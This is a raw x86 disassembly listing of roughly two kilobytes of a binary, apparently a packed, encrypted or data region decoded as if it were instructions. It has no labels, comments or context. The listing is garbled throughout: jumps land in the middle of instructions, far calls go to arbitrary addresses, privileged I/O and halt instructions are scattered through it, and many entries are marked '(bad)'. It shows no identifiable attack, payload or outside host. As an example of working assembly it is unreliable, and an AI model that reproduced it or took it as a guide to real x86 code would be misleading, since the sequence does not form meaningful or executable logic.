  41333a:	jns    0x4133b9
  41333c:	mov    ah,0xb0
  41333e:	mov    cl,0x45
  413340:	push   cs
  413341:	out    dx,eax
  413342:	jnp    0x41336f
  413344:	call   0xd89b3432
  413349:	push   eax
  41334a:	jmp    0x4c672ef5
  41334f:	mov    cl,0x5c
  413351:	push   0x202c13eb
  413356:	jmp    0x56517932
  41335b:	push   eax
  41335c:	push   cs
  41335d:	add    BYTE PTR [ebx],al
  41335f:	sub    bl,dh
  413361:	fild   DWORD PTR ds:0x69cab6d0
  413367:	xor    ah,BYTE PTR [edx-0x35]
  41336a:	mov    eax,0xb710cbed
  41336f:	es push 0x5d
  413372:	push   edx
  413373:	sbb    ebp,DWORD PTR [esi-0x1b]
  413376:	and    dl,BYTE PTR [edi-0x78f3f54a]
  41337c:	mov    ebx,0x8d39c284
  413381:	stos   BYTE PTR es:[edi],al
  413382:	dec    ebp
  413383:	add    DWORD PTR [ebx],ecx
  413385:	dec    ecx
  413386:	jb     0x413398
  413388:	call   0x6c6ca182
  41338d:	cmp    edi,ebp
  41338f:	cwde   
  413390:	xor    eax,0x7a6dc06b
  413395:	sbb    esp,DWORD PTR [ebx]
  413397:	cs sub al,0x74
  41339a:	aam    0xa3
  41339c:	icebp  
  41339d:	mov    ebp,0x7ad34ef
  4133a2:	jo     0x413378
  4133a4:	xor    eax,0x1f16952e
  4133a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133aa:	ficom  DWORD PTR [edx-0x3e57c0d0]
  4133b0:	ret    0x285
  4133b3:	mov    WORD PTR [ecx+0x1bbb4fed],ss
  4133b9:	sub    BYTE PTR [eax-0x2aeeeb30],bh
  4133bf:	push   ss
  4133c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133c1:	cld    
  4133c2:	imul   ebx,DWORD PTR [ecx+0x58],0xf5649fea
  4133c9:	sti    
  4133ca:	add    al,0xff
  4133cc:	dec    ecx
  4133cd:	inc    ecx
  4133ce:	fld    TBYTE PTR [ebp-0x61c9c93]
  4133d4:	cs jp  0x4133d5
  4133d7:	les    ebp,FWORD PTR [edx-0x50]
  4133da:	bound  esi,QWORD PTR [ecx+0x4342db8]
  4133e0:	push   cs
  4133e1:	push   esp
  4133e2:	test   DWORD PTR [ebx-0x299e24a7],esi
  4133e8:	test   al,0xe
  4133eb:	test   al,0x38
  4133ed:	lock test al,0xef
  4133f0:	bound  edi,QWORD PTR [ebx-0x247048a5]
  4133f6:	ret    0x52e2
  4133f9:	jl     0x4133ea
  4133fb:	jge    0x4133f5
  4133fd:	sbb    BYTE PTR [esi],dl
  4133ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413400:	sub    BYTE PTR [ebx],bl
  413402:	mov    edx,0xaa045d88
  413407:	push   esi
  413408:	ror    DWORD PTR [ecx+0x14],cl
  41340b:	test   DWORD PTR [esi-0x27],esi
  41340e:	ss fmul st,st(5)
  413411:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413412:	ret    0x80f9
  413415:	xchg   ebp,eax
  413416:	std    
  413417:	ror    BYTE PTR [edx],1
  413419:	push   ss
  41341a:	fimul  DWORD PTR [ebx-0x38]
  41341d:	retf   
  41341e:	xchg   edi,eax
  41341f:	addr16 push cs
  413421:	fnsave [esi+0x6246b512]
  413427:	sbb    DWORD PTR [ebx-0x68],ebp
  41342a:	xchg   ebp,eax
  41342b:	out    0x52,al
  41342d:	xchg   esi,eax
  41342e:	add    dh,BYTE PTR [esi+0x1ac505b6]
  413434:	sti    
  413435:	(bad)  
  413437:	test   DWORD PTR [edi],ebp
  413439:	ins    BYTE PTR es:[edi],dx
  41343a:	and    bl,al
  41343c:	inc    edi
  41343d:	mov    bh,0xf6
  41343f:	jmp    0x4133eb
  413441:	jl     0x413479
  413443:	add    BYTE PTR [eax],cl
  413445:	adc    DWORD PTR [edi],esi
  413447:	mov    dh,0xf2
  413449:	fild   DWORD PTR [eax]
  41344b:	jno    0x413455
  41344d:	inc    edi
  41344e:	inc    esp
  41344f:	or     al,0x3
  413451:	je     0x41345e
  413453:	ins    DWORD PTR es:[edi],dx
  413454:	(bad)  [edx]
  413456:	mov    bl,0x65
  413458:	cmp    al,0xd1
  41345a:	adc    DWORD PTR [eax],edx
  41345c:	mov    dl,0x28
  41345e:	ins    BYTE PTR es:[edi],dx
  41345f:	inc    ecx
  413460:	mov    ah,0x6
  413462:	aam    0x9f
  413464:	xchg   edi,eax
  413465:	out    dx,al
  413466:	mov    dl,bl
  413468:	inc    ebp
  413469:	pop    ebp
  41346a:	sbb    BYTE PTR [eax],0xa7
  41346d:	adc    eax,0x5b0b6717
  413472:	add    edx,ebp
  413474:	or     ebx,DWORD PTR [ebx]
  413476:	das    
  413477:	cmp    esi,esp
  413479:	cmp    cl,dl
  41347b:	fstp   TBYTE PTR [edx]
  41347d:	sbb    BYTE PTR [ebx+0x1],0x5f
  413481:	sub    DWORD PTR cs:[esi],ecx
  413484:	mov    dh,0x69
  413486:	cwde   
  413487:	mov    dh,0x6d
  413489:	mov    bh,0x6d
  41348b:	or     eax,0x668ca308
  413490:	adc    al,0x50
  413492:	fsubr  QWORD PTR [eax+0x7e]
  413495:	enter  0xd6d,0xd5
  413499:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41349a:	sahf   
  41349b:	fwait
  41349c:	iret   
  41349d:	adc    DWORD PTR [eax-0x4bbe033e],ecx
  4134a3:	inc    ebp
  4134a4:	mov    cl,0x9e
  4134a6:	out    0x58,eax
  4134a8:	pusha  
  4134a9:	ins    DWORD PTR es:[edi],dx
  4134aa:	stos   DWORD PTR es:[edi],eax
  4134ab:	fmul   DWORD PTR cs:[ecx+0x60613bad]
  4134b2:	add    dh,BYTE PTR [eax+0x4760994d]
  4134b8:	ror    esi,1
  4134ba:	sub    al,0x76
  4134bc:	inc    ebp
  4134bd:	add    ebx,esp
  4134bf:	pop    edx
  4134c0:	inc    esp
  4134c1:	mov    ebx,0x24f75c55
  4134c6:	pop    ss
  4134c7:	or     dh,BYTE PTR [edx]
  4134c9:	ins    DWORD PTR es:[edi],dx
  4134ca:	fst    QWORD PTR [esi+0x2d0bd7a7]
  4134d0:	sbb    BYTE PTR [esi+0x1f],dh
  4134d3:	pop    edi
  4134d4:	mov    al,0xb0
  4134d6:	cmp    eax,0x4b7fdf
  4134db:	stos   BYTE PTR es:[edi],al
  4134dc:	pop    ds
  4134dd:	xchg   edi,eax
  4134de:	sbb    eax,0xc0d6cd41
  4134e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134e4:	mov    eax,0x8f388eb4
  4134e9:	div    BYTE PTR [ebx-0x1b]
  4134ec:	pop    esi
  4134ed:	imul   DWORD PTR [ebp+0x65]
  4134f0:	popa   
  4134f1:	adc    esp,ebx
  4134f3:	out    0xb3,eax
  4134f5:	xor    al,0x3b
  4134f7:	push   cs
  4134f8:	sub    ch,BYTE PTR [edx]
  4134fa:	outs   dx,BYTE PTR ds:[esi]
  4134fb:	pop    ebx
  4134fc:	sbb    ebp,esi
  4134fe:	aas    
  4134ff:	or     bl,ch
  413501:	ja     0x4134ca
  413503:	lea    esi,[ebx]
  413505:	jne    0x413518
  413507:	fwait
  413508:	test   eax,0x4c5eb421
  41350d:	mov    al,0x3e
  41350f:	jbe    0x4134ba
  413511:	je     0x413576
  413513:	les    esp,FWORD PTR [esi-0x13]
  413516:	xor    DWORD PTR [edx],eax
  413518:	bound  edi,QWORD PTR [ecx]
  41351a:	jl     0x413505
  41351c:	lea    ebp,[edx-0x49]
  41351f:	mov    dh,0x32
  413521:	jb     0x41350b
  413523:	cmc    
  413524:	mov    dl,BYTE PTR [edi+edi*1]
  413527:	inc    esi
  413528:	(bad)  [esi+0x6d7b158d]
  41352e:	pop    esp
  41352f:	jmp    0xb6da:0xded4cb1a
  413536:	pop    ebx
  413537:	jmp    0xfc27b2a3
  41353c:	add    eax,ebx
  41353e:	push   cs
  41353f:	lods   eax,DWORD PTR ds:[esi]
  413540:	retf   
  413541:	in     al,dx
  413542:	and    BYTE PTR [esi],0x4a
  413545:	push   ecx
  413546:	mov    dh,0xf1
  413548:	mov    dl,0xf1
  41354a:	or     eax,0xc8ba0588
  41354f:	pop    ss
  413550:	fsubr  DWORD PTR [edi-0x5]
  413553:	push   ss
  413554:	mov    dh,0x12
  413556:	ins    DWORD PTR es:[edi],dx
  413557:	cmc    
  413558:	or     cl,BYTE PTR [ebp+0x53af4a1]
  41355e:	mov    cl,0xd0
  413560:	outs   dx,BYTE PTR ds:[esi]
  413561:	xchg   BYTE PTR [eax],bh
  413563:	imul   edi,DWORD PTR [eax-0x6f],0x7d
  413567:	xor    DWORD PTR [ebp-0x65],esi
  41356a:	stos   BYTE PTR es:[edi],al
  41356b:	pop    eax
  41356c:	mov    edx,0xce9565c9
  413571:	aaa    
  413572:	pop    es
  413573:	pop    esp
  413574:	inc    ebp
  413575:	ins    DWORD PTR es:[edi],dx
  413576:	arpl   WORD PTR [ebx+0x871fe6d],sp
  41357c:	repz mov ecx,0xdb44a530
  413582:	push   edx
  413583:	sbb    eax,0xeb977bd0
  413588:	not    edx
  41358a:	fiadd  WORD PTR [edx]
  41358c:	or     edx,DWORD PTR [edi]
  41358e:	(bad)  
  413590:	stos   DWORD PTR es:[edi],eax
  413591:	mov    ah,0xe3
  413593:	jo     0x413539
  413595:	xchg   ebp,eax
  413596:	dec    ebp
  413597:	loopne 0x4135a9
  413599:	loopne 0x413593
  41359b:	mov    ds:0xbc6b6d85,al
  4135a0:	mov    DWORD PTR [esi+0x5f],esi
  4135a3:	ss xor al,0x92
  4135a6:	sub    ch,0xc2
  4135a9:	(bad)  
  4135aa:	sbb    eax,0xef374920
  4135af:	xchg   ebx,eax
  4135b0:	push   ebx
  4135b1:	ss inc esi
  4135b3:	inc    ebx
  4135b4:	add    al,0x9b
  4135b6:	pushf  
  4135b7:	in     al,dx
  4135b8:	leave  
  4135b9:	jae    0x4135a6
  4135bb:	sbb    ebx,edx
  4135bd:	add    ebx,DWORD PTR [ebx]
  4135bf:	shr    BYTE PTR [esi+0x6e],0x83
  4135c3:	push   ecx
  4135c4:	repz mov edi,0x142b741d
  4135ca:	sahf   
  4135cb:	mov    BYTE PTR [ebx+esi*1-0x66],dh
  4135cf:	push   0x3
  4135d1:	push   ecx
  4135d2:	mov    cl,0xab
  4135d4:	mov    dh,0x76
  4135d6:	and    BYTE PTR [edi+0xd18fea6],dh
  4135dc:	inc    esp
  4135dd:	lahf   
  4135de:	jbe    0x413562
  4135e0:	mov    gs:0xc3393311,eax
  4135e6:	shr    esp,0xa2
  4135e9:	test   DWORD PTR [ebx-0x5c],ecx
  4135ec:	test   BYTE PTR [ecx+0x76d77f4c],al
  4135f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135f3:	sub    BYTE PTR [edx-0x477aef8b],bh
  4135f9:	bound  edi,QWORD PTR [ebx]
  4135fb:	rcl    esi,0x8
  4135fe:	pusha  
  4135ff:	jmp    0x4135e6
  413601:	push   0x2d018e9
  413606:	mov    cl,BYTE PTR es:[ebx]
  413609:	in     eax,dx
  41360a:	out    dx,al
  41360b:	(bad)  
  41360c:	ja     0x41365a
  41360e:	inc    ebx
  41360f:	mov    ss,esp
  413611:	outs   dx,BYTE PTR ds:[esi]
  413612:	pop    ebx
  413613:	push   edi
  413614:	aam    0xb0
  413616:	dec    edi
  413617:	stc    
  413618:	jo     0x413606
  41361a:	jmp    0x6e1a8a6c
  41361f:	aaa    
  413620:	cmp    cl,BYTE PTR [eax+0x7cbdb344]
  413626:	pop    es
  413627:	mov    bl,0x9d
  413629:	fsubr  DWORD PTR [esi]
  41362b:	jne    0x413631
  41362d:	out    0x78,eax
  41362f:	pop    esp
  413630:	sub    DWORD PTR [ebx+0x1d],ecx
  413633:	fucomp st(5)
  413635:	mov    dh,0xb0
  413637:	push   eax
  413638:	or     ch,BYTE PTR [esi]
  41363a:	mov    eax,ds:0xaf237e5b
  41363f:	hlt    
  413640:	mov    ecx,0xb42ed6ed
  413645:	sar    BYTE PTR [edx-0x54],0xd8
  413649:	loop   0x4136ad
  41364b:	outs   dx,BYTE PTR ds:[esi]
  41364c:	ins    DWORD PTR es:[edi],dx
  41364d:	cmp    eax,0xa9b68d50
  413652:	mov    BYTE PTR [edx+0xb],dh
  413655:	or     DWORD PTR [ebx],edx
  413657:	das    
  413658:	dec    esi
  413659:	mov    eax,ds:0x82add475
  41365e:	shl    BYTE PTR [edx-0x5b1e9962],1
  413664:	sbb    ebp,DWORD PTR [ebp-0x7f]
  413667:	mov    dh,0x5a
  413669:	xor    cl,BYTE PTR [ecx+0x21]
  41366c:	mov    DWORD PTR [edx+0x1b8a8ec2],eax
  413672:	sbb    edi,DWORD PTR [esi-0x40]
  413675:	pusha  
  413676:	mov    bh,0xb0
  413678:	bound  ecx,QWORD PTR ds:0x75db6c45
  41367e:	jae    0x4136b8
  413680:	lods   al,BYTE PTR ds:[esi]
  413681:	int    0x91
  413683:	sub    edi,DWORD PTR [esi]
  413685:	push   0xffffffbb
  413687:	mov    cl,0xb5
  413689:	jmp    0x6a52:0x124a5080
  413690:	jecxz  0x4136eb
  413692:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413693:	lea    esp,[eax-0x11239cfd]
  413699:	sub    BYTE PTR [eax],ah
  41369b:	in     eax,dx
  41369c:	mov    dh,0x35
  41369e:	mov    bl,ch
  4136a0:	cmp    edi,eax
  4136a2:	cmc    
  4136a3:	pop    edi
  4136a4:	sub    edx,ecx
  4136a6:	stos   BYTE PTR es:[edi],al
  4136a7:	fnsave [esi]
  4136a9:	xchg   esi,eax
  4136aa:	outs   dx,DWORD PTR ds:[esi]
  4136ab:	dec    ebp
  4136ac:	rcl    DWORD PTR [esi+0x0],1
  4136af:	ins    BYTE PTR es:[edi],dx
  4136b0:	ss (bad) 
  4136b2:	call   0xdb8d9858
  4136b7:	sahf   
  4136b8:	fadd   DWORD PTR [ebp+eiz*8-0x6]
  4136bc:	out    dx,eax
  4136bd:	inc    eax
  4136be:	cmp    BYTE PTR [edi-0x2ee2a3e3],0xc2
  4136c5:	jbe    0x41371f
  4136c7:	maxps  xmm6,XMMWORD PTR [edx]
  4136ca:	jbe    0x413725
  4136cc:	adc    eax,0x223a8d48
  4136d1:	mov    dh,0xf9
  4136d3:	out    0x91,al
  4136d5:	fs nop
  4136d7:	add    al,0x2e
  4136d9:	rol    BYTE PTR ds:0x97631ec4,1
  4136df:	popa   
  4136e0:	fistp  DWORD PTR [ecx+ebp*8]
  4136e3:	adc    eax,0xb68a1a97
  4136e8:	mov    BYTE PTR [eax],cl
  4136ea:	enter  0xec48,0x20
  4136ee:	pusha  
  4136ef:	add    edi,DWORD PTR [edi+0x4c]
  4136f2:	pop    edx
  4136f3:	adc    eax,0x52b38aa
  4136f8:	sbb    eax,0x96123751
  4136fd:	jge    0x413701
  4136ff:	fcom   DWORD PTR [esi*2+0x66c74cb0]
  413706:	dec    edi
  413707:	mov    ch,0x5b
  413709:	add    ebp,edx
  41370b:	(bad)  
  41370c:	test   DWORD PTR [ebp-0x3425d2c5],0xb6ed4b6d
  413716:	cmp    BYTE PTR [edx-0x7d],bh
  413719:	lahf   
  41371a:	xchg   esp,eax
  41371b:	out    dx,eax
  41371c:	je     0x4136d4
  41371e:	add    eax,0xa05c051d
  413723:	add    eax,0xda23c056
  413728:	mov    cl,0x6d
  41372a:	sub    al,0x74
  41372c:	stc    
  41372d:	jbe    0x4136db
  41372f:	pushf  
  413730:	sbb    BYTE PTR [esi-0x71],cl
  413733:	mul    DWORD PTR [ebp+0x2ab0b806]
  413739:	ficom  WORD PTR [eax]
  41373b:	pop    esp
  41373c:	add    ah,0x37
  41373f:	or     esi,DWORD PTR [esi-0x545a25ea]
  413745:	xchg   bh,ch
  413747:	xor    eax,0x76329408
  41374c:	rcl    ch,0x45
  41374f:	sub    al,0x5c
  413751:	and    eax,0xfa143a46
  413756:	int3   
  413757:	pop    ss
  413758:	fidiv  DWORD PTR [esi-0x40f31bb]
  41375e:	loop   0x4137b0
  413760:	fnstcw WORD PTR [edx]
  413762:	cmc    
  413763:	sub    BYTE PTR [ebp+0x3],0x11
  413767:	lods   eax,DWORD PTR ds:[esi]
  413768:	dec    eax
  413769:	mov    es,WORD PTR [ebx-0x49fa6808]
  41376f:	mov    fs,WORD PTR [edi-0x456ba304]
  413775:	mov    ecx,0xe201d096
  41377a:	(bad)  
  41377b:	adc    al,0xaf
  41377d:	in     eax,0x38
  41377f:	outs   dx,DWORD PTR ds:[esi]
  413780:	retf   
  413781:	fcmovnu st,st(3)
  413783:	push   ss
  413784:	fidiv  DWORD PTR [esi+0x672051cc]
  41378a:	cmp    ecx,DWORD PTR [edi+0x2a]
  41378d:	sbb    eax,0xb6db352c
  413792:	icebp  
  413793:	jno    0x413730
  413795:	(bad)  
  413796:	xchg   ebx,eax
  413797:	mov    al,ds:0xa36be127
  41379c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41379d:	arpl   WORD PTR [edx+0x6d],bp
  4137a0:	in     al,dx
  4137a1:	mov    ch,BYTE PTR [edi+0x48]
  4137a4:	and    ch,BYTE PTR [edi+0x56fdf296]
  4137aa:	les    edx,FWORD PTR [esi+0xa]
  4137ad:	or     BYTE PTR [eax-0x50],ch
  4137b0:	mov    ecx,0xa8d6e8a9
  4137b5:	mov    cl,0x59
  4137b7:	(bad)  
  4137b8:	repnz inc ebp
  4137ba:	add    BYTE PTR [edx+0x47],ah
  4137bd:	mov    ch,0x30
  4137bf:	adc    DWORD PTR [ecx-0x8],ecx
  4137c2:	scas   al,BYTE PTR es:[edi]
  4137c3:	sbb    edx,0xffffffb6
  4137c6:	ins    DWORD PTR es:[edi],dx
  4137c7:	and    eax,0x1f47659f
  4137cc:	mov    ecx,0x2ed60270
  4137d1:	ins    BYTE PTR es:[edi],dx
  4137d2:	mov    ah,0x6d
  4137d4:	rol    ebp,cl
  4137d6:	xor    bl,cl
  4137d8:	data16 cs jbe 0x41384c
  4137dc:	add    eax,0x8b841bb5
  4137e1:	je     0x413807
  4137e3:	add    al,0x91
  4137e5:	fnsave es:[esi+0x7802a152]
  4137ec:	adc    al,0xbf
  4137ee:	mov    dh,0xda
  4137f0:	dec    esp
  4137f1:	test   cl,dl
  4137f3:	ss inc ebp
  4137f5:	mov    al,0xd1
  4137f7:	fbld   TBYTE PTR [esi]
  4137f9:	ins    DWORD PTR es:[edi],dx
  4137fa:	push   esp
  4137fb:	sbb    eax,0xb6ed8fdb
  413800:	xor    BYTE PTR [edx],bl
  413802:	mov    dh,0xa6
  413804:	call   0xd4f2ae89
  413809:	lds    esp,FWORD PTR [ecx-0x48f4fb05]
  41380f:	sbb    bl,dh
  413811:	add    DWORD PTR [esi-0x4e],ebp
  413814:	icebp  
  413815:	(bad)
  413819:	sbb    eax,0xcf8ff8d6
  41381e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41381f:	out    dx,al
  413820:	push   ds
  413821:	xor    al,0x15
  413823:	fnstsw WORD PTR [edx-0x50d6cd5b]
  413829:	push   0x44ad766f
  41382e:	sub    eax,0xeef02e2c
  413833:	xchg   ebx,eax
  413834:	test   eax,0x450d4bfe
  413839:	fistp  DWORD PTR [eax]
  41383b:	cmp    cl,dh
  41383d:	sbb    eax,0x611a0bfb
  413842:	push   ss
  413843:	fimul  DWORD PTR [esi]
  413845:	cmp    BYTE PTR [ebx+0x52],0x7d
  413849:	dec    edx
  41384a:	mov    dh,0x43
  41384c:	mov    edi,0xdb70b4a3
  413851:	(bad)
  413854:	gs ret 
  413856:	mov    ch,0xff
  413858:	inc    ecx
  413859:	repz das 
  41385b:	ins    BYTE PTR es:[edi],dx
  41385c:	fld    TBYTE PTR [ebp-0x25]
  41385f:	cmc    
  413860:	mov    al,ds:0xcb6295a2
  413865:	cmp    al,0x43
  413867:	mov    ch,0x0
  413869:	(bad)  
  41386a:	mov    al,ds:0x3f960086
  41386f:	mov    ecx,0xda162b8f
  413874:	push   cs
  413875:	fiadd  DWORD PTR [edx+0x6a3fca8f]
  41387b:	sbb    al,BYTE PTR [ecx]
  41387d:	pop    esi
  41387e:	sub    al,0x34
  413880:	adc    eax,0x2da959dd
  413885:	and    al,0x7c
  413887:	jo     0x4138ae
  413889:	mov    al,0x35
  41388b:	rol    DWORD PTR [esi],0x8a
  41388e:	jl     0x413825
  413890:	js     0x4138fa
  413892:	out    dx,al
  413893:	in     eax,dx
  413894:	(bad)  
  413895:	mov    dh,0xb4
  413897:	std    
  413898:	mov    bh,0x3e
  41389a:	pop    ebp
  41389b:	dec    edx
  41389c:	pop    ecx
  41389d:	setns  BYTE PTR [ebp+eax*1-0x4a]
  4138a2:	or     dh,BYTE PTR [esi]
  4138a4:	push   ebx
  4138a5:	ss mov cs,WORD PTR ds:[edx]
  4138a9:	stc    
  4138aa:	pop    edx
  4138ab:	pusha  
  4138ac:	xor    edx,esp
  4138ae:	sub    DWORD PTR [eax+0x7a2407d],eax
  4138b4:	mov    ch,0xd0
  4138b6:	add    DWORD PTR [ebp+0x5],ebx
  4138b9:	push   edi
  4138ba:	fcmovnbe st,st(6)
  4138bc:	es add al,0xf3
  4138bf:	rcl    BYTE PTR [esp+esi*4],0x44
  4138c3:	jmp    0xdda:0xd808efbd
  4138ca:	jecxz  0x413891
  4138cc:	pop    ss
  4138cd:	jp     0x4138d7
  4138cf:	mov    edx,ss
  4138d1:	lods   eax,DWORD PTR ds:[esi]
  4138d2:	add    ebx,edx
  4138d4:	pop    ecx
  4138d5:	stc    
  4138d6:	pop    esi
  4138d7:	mov    dh,0x65
  4138d9:	jp     0x4138e9
  4138db:	inc    esp
  4138dc:	mov    ch,0x6d
  4138de:	pop    ebp
  4138df:	sar    DWORD PTR [ecx],0x26
  4138e2:	xor    ebp,ecx
  4138e4:	mov    ah,0xd7
  4138e6:	rcl    DWORD PTR [esi],0xb6
  4138e9:	add    dh,BYTE PTR [ecx+0x174f7b16]
  4138ef:	pop    ecx
  4138f0:	cs stos DWORD PTR es:[edi],eax
  4138f2:	ds mov al,0x6d
  4138f5:	xchg   edi,eax
  4138f6:	sbb    eax,0xf17af4f7
  4138fb:	jmp    0x1b5ca5a1
  413900:	mov    al,0xb5
  413902:	sub    eax,0x411d4315
  413907:	imul   ebx,DWORD PTR [ebp+eax*4-0x7a49490b],0x2
  41390f:	add    eax,DWORD PTR [edi]
  413911:	sub    al,0x4a
  413913:	test   BYTE PTR [eax],dl
  413915:	jmp    0x28580ff0
  41391a:	cmp    dh,0x95
  41391d:	fstp   QWORD PTR [ecx]
  41391f:	std    
  413920:	inc    eax
  413921:	pop    ss
  413922:	cmp    ah,al
  413924:	dec    eax
  413925:	aad    0x24
  413927:	and    bh,bl
  413929:	(bad)  
  41392a:	scas   al,BYTE PTR es:[edi]
  41392b:	in     eax,dx
  41392c:	and    dl,bl
  41392e:	ss dec ebp
  413930:	or     al,0xc0
  413932:	mov    DWORD PTR [edx-0x5c],esp
  413935:	je     0x4139b1
  413937:	push   esi
  413938:	mov    edx,0x9aa40175
  41393d:	inc    esp
  41393e:	clc    
  41393f:	aam    0x41
  413941:	into   
  413942:	add    eax,0x71c41682
  413947:	push   ecx
  413948:	sub    DWORD PTR [edx-0x16],ebx
  41394b:	test   al,0x5b
  41394d:	shr    DWORD PTR [ebx+ecx*1+0x9],cl
  413951:	xchg   ebx,eax
  413952:	add    eax,0x415d5b0d
  413957:	xchg   edi,eax
  413958:	push   edi
  413959:	fs shl ecx,1
  41395c:	jns    0x4138f8
  41395e:	outs   dx,DWORD PTR ds:[esi]
  41395f:	mov    cl,0xb0
  413961:	lock add eax,0x384fded6
  413967:	pop    ds
  413968:	aas    
  413969:	sbb    ebp,ebp
  41396b:	mov    dh,0xb0
  41396d:	push   ds
  41396e:	out    dx,eax
  41396f:	or     eax,0x2317594f
  413974:	mov    DWORD PTR [edi],esp
  413976:	ficom  DWORD PTR [ebp+0xb]
  413979:	or     ebx,DWORD PTR [ebx]
  41397b:	ror    BYTE PTR [edx-0x27],cl
  41397e:	pop    esi
  41397f:	mov    edx,edx
  413981:	mov    ch,0xd
  413983:	inc    ecx
  413984:	ins    BYTE PTR es:[edi],dx
  413985:	and    eax,DWORD PTR [edx+0x48]
  413988:	repz sub DWORD PTR [esi],esp
  41398b:	inc    ecx
  41398c:	mov    al,0xa1
  41398e:	mov    edx,0x86beaf20
  413993:	mov    esi,0x551a172d
  413998:	je     0x413986
  41399a:	and    al,0xef
  41399c:	add    al,0x29
  41399e:	pop    ebx
  41399f:	xchg   ebp,eax
  4139a0:	stos   BYTE PTR es:[edi],al
  4139a1:	(bad)  [eax-0x6b]
  4139a4:	out    0x85,eax
  4139a6:	pop    cx
  4139a8:	dec    ebp
  4139a9:	or     al,bl
  4139ab:	mov    edx,0x7ddd1a2d
  4139b0:	mov    dh,0x61
  4139b2:	add    edi,ecx
  4139b4:	fisubr DWORD PTR [edx]
  4139b6:	pop    esp
  4139b7:	call   0xfebd4945
  4139bc:	add    DWORD PTR [ebx-0x4e],ebx
  4139bf:	in     al,dx
  4139c0:	and    edx,esp
  4139c2:	inc    edx
  4139c3:	test   eax,0x6baaf72a
  4139c8:	push   eax
  4139c9:	ins    DWORD PTR es:[edi],dx
  4139ca:	ins    DWORD PTR es:[edi],dx
  4139cb:	push   edi
  4139cc:	mov    al,0x5b
  4139ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139cf:	das    
  4139d0:	push   esp
  4139d1:	push   esi
  4139d2:	push   eax
  4139d3:	loopne 0x41399f
  4139d5:	sub    BYTE PTR [edx-0x30],cl
  4139d8:	mov    eax,0x2277e5ef
  4139dd:	into   
  4139de:	call   0xeda:0xe3d6c2e8
  4139e5:	cmp    eax,0x2369d911
  4139ea:	mov    al,0xb1
  4139ec:	xchg   ebp,eax
  4139ed:	mov    BYTE PTR [eax],dl
  4139ef:	mov    dh,0xa5
  4139f1:	pop    ebp
  4139f2:	call   0x46c2a27c
  4139f7:	mov    eax,0xad3d4b24
  4139fc:	mov    al,0x29
  4139fe:	mov    BYTE PTR [edx],al
  413a00:	ins    DWORD PTR es:[edi],dx
  413a01:	push   0xd8d7dca9
  413a06:	adc    al,0xc4
  413a08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a09:	cdq    
  413a0a:	jecxz  0x413a26
  413a0c:	loopne 0x4139ae
  413a0e:	jmp    0x53168184
  413a13:	push   eax
  413a14:	add    DWORD PTR [edi-0x75d1e4e9],ebx
  413a1a:	gs popa 
  413a1c:	jg     0x413a76
  413a1e:	push   ebp
  413a1f:	je     0x413a17
  413a21:	xchg   ecx,eax
  413a22:	mov    cl,0xb1
  413a24:	sub    eax,0x4d915640
  413a29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a2a:	mov    bh,0x40
  413a2c:	or     eax,0xdc02b636
  413a31:	retf   
  413a32:	dec    eax
  413a33:	mov    edx,0xd1bb4dd3
  413a38:	adc    al,al
  413a3a:	push   ecx
  413a3b:	shr    BYTE PTR [edx-0x52c26caf],0xda
  413a42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a44:	xchg   DWORD PTR [ebp+0x3d],esp
  413a47:	jbe    0x4139ec
  413a49:	jge    0x413aa4
  413a4b:	sahf   
  413a4c:	adc    ebp,eax
  413a4e:	test   DWORD PTR [ebp-0x1ff63273],eax
  413a54:	xchg   esp,eax
  413a55:	mov    cl,0x4c
  413a57:	jbe    0x413ad1
  413a59:	(bad)  
  413a5a:	fist   DWORD PTR [esi]
  413a5c:	ss mov esi,0x9c6455a7
  413a62:	mov    dh,0x6d
  413a64:	sub    DWORD PTR [esi-0x44feeca5],0x48
  413a6b:	(bad)  
  413a6c:	or     ah,BYTE PTR [edx+0x4d]
  413a6f:	and    ch,dl
  413a71:	lods   eax,DWORD PTR ds:[esi]
  413a72:	in     eax,dx
  413a73:	stos   BYTE PTR es:[edi],al
  413a74:	mov    dh,0xca
  413a76:	xor    bh,BYTE PTR [eax+0x2]
  413a79:	sub    esi,DWORD PTR [edi+ecx*4-0x2527a7f5]
  413a80:	lea    esi,[ebx-0x10]
  413a83:	iret   
  413a84:	xor    DWORD PTR [ecx+0x35],ebx
  413a87:	nop
  413a88:	inc    esi
  413a89:	jo     0x413a38
  413a8b:	pop    ebx
  413a8c:	sub    edx,ebx
  413a8e:	test   dl,al
  413a90:	jecxz  0x413aee
  413a92:	outs   dx,DWORD PTR gs:[esi]
  413a94:	push   ss
  413a95:	data16 test al,0x1
  413a98:	xchg   esi,eax
  413a99:	lea    edx,[edx+0x44e6f68b]
  413a9f:	pop    ss
  413aa0:	add    eax,0xa585c55b
  413aa5:	cmp    bh,cl
  413aa7:	inc    esi
  413aa8:	add    ebp,DWORD PTR [ecx+eax*2]
  413aab:	stos   DWORD PTR es:[edi],eax
  413aac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413aad:	stc    
  413aae:	jmp    0x413aa3
  413ab0:	dec    eax
  413ab1:	mov    eax,gs:0xd666e821
  413ab7:	mov    ch,0xeb
  413ab9:	icebp  
  413aba:	pop    ebp
  413abb:	add    edx,DWORD PTR [eax]
  413abd:	mov    bh,0xa5
  413abf:	pop    ss
  413ac0:	or     BYTE PTR [edi],ah
  413ac2:	dec    edx
  413ac3:	icebp  
  413ac4:	std    
  413ac5:	push   ebp
  413ac6:	sub    al,0xd0
  413ac8:	mov    dh,0x6d
  413aca:	fnstcw WORD PTR [esi]
  413acc:	pop    ecx
  413acd:	push   es
